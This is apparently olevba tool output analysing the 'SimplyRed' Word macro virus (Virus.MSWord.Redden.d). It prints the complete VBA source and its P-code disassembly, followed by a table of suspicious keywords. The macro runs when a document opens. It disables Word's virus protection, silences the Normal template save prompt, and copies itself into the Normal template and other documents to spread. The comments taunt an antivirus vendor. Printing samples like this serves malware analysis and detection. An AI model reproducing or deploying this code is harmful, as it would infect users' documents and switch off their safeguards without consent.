olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()

'AVP ------- *SUX* Go fU(k yourself Kaspersky!
'SimplyRed is tRuNcEd but it's ALIVE
'|mm0R†aL VIRii
'SimplyRed by N|(0†|N 2000

On Error GoTo Phuck
If Int(Rnd * 50) = 9 Then
    ActiveDocument.Background.Fill.ForeColor.RGB = RGB(255, 0, 0)
    ActiveDocument.Background.Fill.Visible = msoTrue
    ActiveDocument.Background.Fill.Solid
    ActiveWindow.View.Type = wdOnlineView
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set stlth = ActiveDocument.VBProject
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
Set stlth = NormalTemplate.VBProject
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
cnt = stlth.VBComponents.Count
If cnt <> 0 Then
For i = 1 To cnt
aprj = stlth.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
Else
already = False
End If
If Not already Then
stlth.VBComponents.Add (vbext_ct_StdModule)
stlth.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
End If
Phuck:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Redden.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3345 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x002D "AVP ------- *SUX* Go fU(k yourself Kaspersky!"
' Line #5:
' 	QuoteRem 0x0000 0x0023 "SimplyRed is tRuNcEd but it's ALIVE"
' Line #6:
' 	QuoteRem 0x0000 0x000E "|mm0R†aL VIRii"
' Line #7:
' 	QuoteRem 0x0000 0x0019 "SimplyRed by N|(0†|N 2000"
' Line #8:
' Line #9:
' 	OnError Phuck 
' Line #10:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #12:
' 	Ld msoTrue 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #14:
' 	Ld wdOnlineView 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #18:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #20:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set stlth 
' Line #21:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #24:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #25:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set stlth 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #28:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #30:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #31:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #34:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #35:
' 	LitVarSpecial (False)
' 	St already 
' Line #36:
' 	Ld stlth 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St cnt 
' Line #37:
' 	Ld cnt 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cnt 
' 	For 
' Line #39:
' 	Ld i 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #40:
' 	Ld aprj 
' 	LitStr 0x0009 "SimplyRed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	LitVarSpecial (False)
' 	St already 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #46:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld stlth 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #47:
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Label Phuck 
' Line #50:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

